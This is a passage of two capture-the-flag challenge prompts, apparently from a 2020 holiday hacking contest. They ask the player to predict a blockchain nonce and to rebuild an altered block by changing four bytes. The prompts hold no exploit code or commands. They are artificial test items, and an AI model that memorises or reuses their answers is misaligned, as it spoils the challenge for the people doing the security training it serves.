### 11a. Naughty/Nice List with Blockchain Investigation Part 1

Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and [tools](https://download.holidayhackchallenge.com/2020/OfficialNaughtyNiceBlockchainEducationPack.zip). (Enter just the 16-character hex value of the nonce)

### 11b. Naughty/Nice List with Blockchain Investigation Part 2

The SHA256 of Jack's altered block is: 58a3b9335a6ceb0234c12d35a0564c4e f0e90152d0eb2ce2082383b38028a90f. If you're clever, you can recreate the original version of that block by changing the values of only 4 bytes. Once you've recreated the original block, what is the SHA256 of that block?
